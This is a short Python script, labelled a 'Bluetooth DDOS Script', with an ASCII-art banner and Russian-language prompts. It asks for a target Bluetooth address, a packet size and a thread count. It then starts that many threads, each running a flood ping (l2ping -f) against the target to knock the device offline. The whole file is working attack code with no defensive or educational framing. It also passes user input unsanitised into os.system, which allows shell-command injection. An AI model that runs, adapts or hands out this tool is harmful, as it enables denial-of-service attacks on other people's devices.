import os
import threading
import time

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():
    print('\x1b[37;4mhttps://github.com/MrArtemIT\x1b[0m')
    print('\x1b[37;36m')
    print('                                Bluetooth DDOS Script                            ')
    print('''             +------------------------------------------------------------------+
             |███╗░░░███╗██████╗░░░░░█████╗░██████╗░████████╗███████╗███╗░░░███╗|
             |████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗╚══██╔══╝██╔════╝████╗░████║|
             |██╔████╔██║██████╔╝░░░███████║██████╔╝░░░██║░░░█████╗░░██╔████╔██║|
             |██║╚██╔╝██║██╔══██╗░░░██╔══██║██╔══██╗░░░██║░░░██╔══╝░░██║╚██╔╝██║|
             |██║░╚═╝░██║██║░░██║██╗██║░░██║██║░░██║░░░██║░░░███████╗██║░╚═╝░██║|
             |╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝|
             +------------------------------------------------------------------+''')
    print('\x1b[0m')

def main():
    printLogo()
    time.sleep(0.1)
    print('')
    if True:
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')

        target_addr = input('Адрес цели > ')

        if len(target_addr) < 1:
            print('[!] ОШИБКА: Целевой адрес отсутствует')
            exit(0)

        try:
            packages_size = int(input('Размер пакетов > '))
        except:
            print('[!] ОШИБКА: размер пакетов должен быть целым числом')
            exit(0)
        try:
            threads_count = int(input('Количество потоков > '))
        except:
            print('[!] ОШИБКА: количество потоков должно быть целым числом')
            exit(0)
        print('')
        os.system('clear')
        print('[b̻͚̟l̡̺u͓͔e͖͖̙d̙̠͍d̠͉̘o͍̪̙s͇͎̫] Стартуем!')
        print('[b̻͚̟l̡̺u͓͔e͖͖̙d̙̠͍d̠͉̘o͍̪̙s͇͎̫] Построение потоков...\n')

        for i in range(0, threads_count):
            print('[*] Built thread №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[b̻͚̟l̡̺u͓͔e͖͖̙d̙̠͍d̠͉̘o͍̪̙s͇͎̫] Построил все потоки...')
    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[b̻͚̟l̡̺u͓͔e͖͖̙d̙̠͍d̠͉̘o͍̪̙s͇͎̫] Отмена')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
